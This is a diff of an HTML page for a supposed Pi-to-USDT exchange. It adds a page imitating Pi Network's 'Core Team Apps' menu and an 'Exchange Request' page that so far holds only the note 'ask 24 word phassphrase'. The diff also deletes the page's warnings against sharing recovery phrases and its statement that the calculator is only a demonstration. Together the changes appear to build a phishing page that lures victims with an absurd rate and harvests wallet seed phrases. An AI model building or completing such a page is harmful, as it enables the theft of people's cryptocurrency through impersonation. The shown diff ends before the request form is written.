@@ -13,6 +13,10 @@
   padding:0;
 }
 
+html{
+  scroll-behavior:smooth;
+}
+
 body{
   font-family:Arial,Helvetica,sans-serif;
   background:#070812;
@@ -20,6 +24,7 @@ body{
   line-height:1.6;
 }
 
+/* HEADER */
 header{
   background:#101225;
   padding:18px 20px;
@@ -27,6 +32,9 @@ header{
   justify-content:space-between;
   align-items:center;
   border-bottom:1px solid #292d45;
+  position:sticky;
+  top:0;
+  z-index:100;
 }
 
 .logo{
@@ -43,6 +51,7 @@ header{
   font-size:13px;
 }
 
+/* HERO */
 .hero{
   text-align:center;
   padding:70px 20px;
@@ -93,6 +102,13 @@ header{
   font-weight:bold;
   background:#f5b942;
   color:#111;
+  border:none;
+  cursor:pointer;
+  font-size:16px;
+}
+
+.btn:hover{
+  opacity:.9;
 }
 
 .btn.secondary{
@@ -101,6 +117,7 @@ header{
   border:1px solid #f5b942;
 }
 
+/* GENERAL CONTAINER */
 .container{
   max-width:1050px;
   margin:auto;
@@ -113,6 +130,7 @@ header{
   margin-bottom:30px;
 }
 
+/* INFORMATION CARDS */
 .cards{
   display:grid;
   grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
@@ -140,6 +158,94 @@ header{
   color:#b8bdce;
 }
 
+/* PI APPS PAGE */
+#pi-apps{
+  background:#f7f7f9;
+  color:#70428f;
+  max-width:none;
+  min-height:650px;
+  padding:45px 20px 70px;
+}
+
+.pi-apps-inner{
+  max-width:850px;
+  margin:auto;
+}
+
+.pi-apps-header{
+  background:#70428f;
+  color:white;
+  padding:18px 20px;
+  border-radius:15px 15px 0 0;
+  text-align:center;
+  font-size:24px;
+  margin-bottom:30px;
+}
+
+.core-title{
+  color:#111;
+  font-size:24px;
+  margin-bottom:30px;
+  text-align:center;
+}
+
+.apps-grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:28px;
+  max-width:760px;
+  margin:auto;
+}
+
+.app-card{
+  position:relative;
+  text-align:center;
+  padding:12px 8px;
+  color:#70428f;
+  cursor:pointer;
+  transition:.2s;
+  border-radius:15px;
+}
+
+.app-card:hover{
+  transform:translateY(-5px);
+  background:#f0edf4;
+}
+
+.app-icon{
+  width:110px;
+  height:110px;
+  margin:auto;
+  border:2px solid #70428f;
+  border-radius:22px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:52px;
+  font-weight:bold;
+  background:white;
+}
+
+.app-card h3{
+  margin-top:10px;
+  font-size:20px;
+  font-weight:normal;
+}
+
+.new-badge{
+  position:absolute;
+  right:0;
+  top:-10px;
+  background:#f5b942;
+  color:#111;
+  padding:6px 14px;
+  border-radius:18px;
+  font-size:13px;
+  font-weight:bold;
+  z-index:2;
+}
+
+/* EXCHANGE REQUEST */
 .exchange{
   max-width:650px;
   margin:0 auto;
@@ -194,6 +300,43 @@ header{
   color:#f5b942;
 }
 
+.notice{
+  margin-top:20px;
+  padding:20px;
+  background:#171a29;
+  border-left:4px solid #f5b942;
+  border-radius:10px;
+  color:#c5cad7;
+}
+
+/* AUTHORIZATION NOTICE */
+.authorization{
+  text-align:center;
+  margin-bottom:25px;
+}
+
+.authorization-icon{
+  width:65px;
+  height:65px;
+  border-radius:50%;
+  background:#7b3fe4;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  margin:0 auto 15px;
+  font-size:30px;
+}
+
+.authorization h3{
+  color:#f5b942;
+  margin-bottom:8px;
+}
+
+.authorization p{
+  color:#b8bdce;
+}
+
+/* GUIDE */
 .steps{
   max-width:800px;
   margin:auto;
@@ -229,15 +372,7 @@ header{
   color:#b8bdce;
 }
 
-.notice{
-  margin-top:30px;
-  padding:20px;
-  background:#171a29;
-  border-left:4px solid #f5b942;
-  border-radius:10px;
-  color:#c5cad7;
-}
-
+/* FOOTER */
 footer{
   text-align:center;
   padding:35px 20px;
@@ -250,6 +385,16 @@ footer strong{
   color:#f5b942;
 }
 
+/* HIDDEN PAGES */
+.page{
+  display:none;
+}
+
+.page.active{
+  display:block;
+}
+
+/* MOBILE */
 @media(max-width:600px){
 
   header{
@@ -280,8 +425,35 @@ footer strong{
     font-size:25px;
   }
 
+  .apps-grid{
+    grid-template-columns:repeat(3,1fr);
+    gap:8px;
+  }
+
+  .app-icon{
+    width:78px;
+    height:78px;
+    border-radius:17px;
+    font-size:38px;
+  }
+
+  .app-card h3{
+    font-size:14px;
+  }
+
+  .new-badge{
+    font-size:10px;
+    padding:5px 8px;
+    right:-2px;
+  }
+
   .step{
     padding:16px;
+  }
+
+  .btn{
+    width:90%;
+    max-width:340px;
   }
 }
 </style>
@@ -289,184 +461,324 @@ footer strong{
 
 <body>
 
+<!-- HEADER -->
 <header>
   <div class="logo">π Pi ↔ USDT</div>
   <div class="badge">Exchange Information</div>
 </header>
 
-<section class="hero">
 
-  <div class="pi">π</div>
+<!-- =====================================================
+     PAGE 1 — LANDING PAGE
+===================================================== -->
 
-  <h1>Pi <span>↔</span> USDT Exchange</h1>
+<div id="home-page" class="page active">
 
-  <p>
-    Explore the Pi-to-USDT exchange process with a simple,
-    mobile-friendly interface and step-by-step guidance.
-  </p>
+  <section class="hero">
 
-  <div class="buttons">
-    <a href="#exchange" class="btn">Open Exchange Demo</a>
-    <a href="#guide" class="btn secondary">View Guide</a>
-  </div>
+    <div class="pi">π</div>
 
-</section>
+    <h1>
+      Pi <span>↔</span> USDT Exchange
+    </h1>
 
-<section class="container">
+    <p>
+      Explore the Pi-to-USDT exchange process with a simple,
+      mobile-friendly interface and step-by-step guidance.
+    </p>
 
-  <h2 class="title">Why Use the Exchange?</h2>
+    <div class="buttons">
 
-  <div class="cards">
+      <!-- THIS NOW GOES TO PI APPS -->
+      <button class="btn" onclick="showApps()">
+        Exchange
+      </button>
 
-    <div class="card">
-      <div class="icon">🔄</div>
-      <h3>Pi ↔ USDT</h3>
-      <p>
-        Review the conversion process between Pi and USDT
-        through an easy-to-use interface.
-      </p>
+      <a href="#guide" class="btn secondary">
+        View Guide
+      </a>
+
     </div>
 
-    <div class="card">
-      <div class="icon">⚡</div>
-      <h3>Simple Process</h3>
-      <p>
-        Follow clear steps from entering an amount to reviewing
-        the exchange information.
-      </p>
-    </div>
+  </section>
 
-    <div class="card">
-      <div class="icon">🔐</div>
-      <h3>Stay Secure</h3>
-      <p>
-        Never share your wallet passphrase, private key,
-        password or recovery phrase.
-      </p>
-    </div>
 
-  </div>
+  <section class="container">
 
-</section>
+    <h2 class="title">
+      Why Use the Exchange?
+    </h2>
 
-<section class="container" id="exchange">
+    <div class="cards">
 
-  <h2 class="title">Exchange Calculator</h2>
+      <div class="card">
+        <div class="icon">🔄</div>
 
-  <div class="exchange">
+        <h3>Pi ↔ USDT</h3>
 
-    <label for="piAmount">Pi Amount</label>
-
-    <input
-      id="piAmount"
-      type="number"
-      min="0"
-      step="0.01"
-      placeholder="Enter Pi amount"
-      oninput="calculate()"
-    >
-
-    <div class="rate">
-      Demonstration rate: 1 Pi = 314,159 USDT
-    </div>
-
-    <div class="result">
-      Estimated USDT
-      <strong id="usdtResult">0 USDT</strong>
-    </div>
-
-    <div class="notice">
-      This calculator is a demonstration only. It does not execute
-      cryptocurrency transactions and the displayed rate is not a
-      live market price.
-    </div>
-
-  </div>
-
-</section>
-
-<section class="container" id="guide">
-
-  <h2 class="title">How the Exchange Process Works</h2>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="number">1</div>
-      <div>
-        <h3>Open the Exchange</h3>
         <p>
-          Open the exchange interface you intend to use and verify
-          that you are on the correct website.
+          Review the conversion process between Pi and USDT
+          through an easy-to-use interface.
         </p>
       </div>
-    </div>
 
-    <div class="step">
-      <div class="number">2</div>
-      <div>
-        <h3>Enter the Amount</h3>
+
+      <div class="card">
+        <div class="icon">⚡</div>
+
+        <h3>Simple Process</h3>
+
         <p>
-          Enter the amount of Pi you want to review or exchange.
+          Follow clear steps from entering an amount to reviewing
+          the exchange information.
         </p>
       </div>
-    </div>
 
-    <div class="step">
-      <div class="number">3</div>
-      <div>
-        <h3>Review the Details</h3>
+
+      <div class="card">
+        <div class="icon">🔐</div>
+
+        <h3>Stay Secure</h3>
+
         <p>
-          Carefully check the amount, destination and applicable
-          fees before confirming anything.
+          Never share your wallet passphrase, private key,
+          password or recovery phrase.
         </p>
       </div>
+
     </div>
 
-    <div class="step">
-      <div class="number">4</div>
-      <div>
-        <h3>Confirm</h3>
-        <p>
-          Only confirm a transaction after verifying all details
-          and ensuring that you trust the service.
-        </p>
+  </section>
+
+</div>
+
+
+<!-- =====================================================
+     PAGE 2 — PI APPS / CORE TEAM APPS
+===================================================== -->
+
+<div id="apps-page" class="page">
+
+  <section id="pi-apps">
+
+    <div class="pi-apps-inner">
+
+      <div class="pi-apps-header">
+        Home π
       </div>
+
+      <h2 class="core-title">
+        Core Team Apps
+      </h2>
+
+
+      <div class="apps-grid">
+
+        <!-- EXCHANGE -->
+        <div class="app-card" onclick="showExchangeRequest()">
+
+          <div class="new-badge">
+            New
+          </div>
+
+          <div class="app-icon">
+            π
+          </div>
+
+          <h3>
+            Exchange
+          </h3>
+
+        </div>
+
+
+        <!-- WALLET -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            ▣
+          </div>
+
+          <h3>
+            Wallet
+          </h3>
+
+        </div>
+
+
+        <!-- FIRESIDE -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            🔥
+          </div>
+
+          <h3>
+            Fireside
+          </h3>
+
+        </div>
+
+
+        <!-- BRAINSTORM -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            💡
+          </div>
+
+          <h3>
+            Brainstorm
+          </h3>
+
+        </div>
+
+
+        <!-- MINE -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            π
+          </div>
+
+          <h3>
+            Mine
+          </h3>
+
+        </div>
+
+
+        <!-- BLOCKCHAIN -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            ⛓
+          </div>
+
+          <h3>
+            Blockchain
+          </h3>
+
+        </div>
+
+
+        <!-- DEVELOP -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            💻
+          </div>
+
+          <h3>
+            Develop
+          </h3>
+
+        </div>
+
+
+        <!-- KYC -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            🪪
+          </div>
+
+          <h3>
+            KYC
+          </h3>
+
+        </div>
+
+
+        <!-- CHAT -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            💬
+          </div>
+
+          <h3>
+            Chat
+          </h3>
+
+        </div>
+
+
+        <!-- PROFILES -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            👤
+          </div>
+
+          <h3>
+            Profiles
+          </h3>
+
+        </div>
+
+
+        <!-- DOMAIN -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            .pi
+          </div>
+
+          <h3>
+            Domain
+          </h3>
+
+        </div>
+
+
+        <!-- APP STUDIO -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            ✦
+          </div>
+
+          <h3>
+            App Studio
+          </h3>
+
+        </div>
+
+
+        <!-- LAUNCHPAD -->
+        <div class="app-card">
+
+          <div class="app-icon">
+            ↑
+          </div>
+
+          <h3>
+            Launchpad
+          </h3>
+
+        </div>
+
+      </div>
+
     </div>
 
-  </div>
+  </section>
 
-  <div class="notice">
-    <strong>Security reminder:</strong>
-    Never give anyone your Pi Wallet passphrase, private key,
-    recovery phrase or login credentials. A legitimate service
-    should not require your secret recovery phrase to receive or
-    process a transaction.
-  </div>
+</div>
 
-</section>
 
-<footer>
-  <p><strong>π Pi ↔ USDT</strong></p>
-  <p>Information & demonstration interface</p>
-  <p>© 2026</p>
-</footer>
+<!-- =====================================================
+     PAGE 3 — EXCHANGE REQUEST
+===================================================== -->
 
-<script>
-function calculate(){
+<div id="exchange-page" class="page">
 
-  const pi = parseFloat(
-    document.getElementById("piAmount").value
-  ) || 0;
+  <section class="container">
 
-  const rate = 314159;
+    <h2 class="title">
+      Exchange Request
+    </h2> ask 24 word phassphrase 
 
-  const result = pi * rate;
 
-  document.getElementById("usdtResult").textContent =
-    result.toLocaleString() + " USDT";
-}
-</script>
-
-</body>
-  </html>
+   
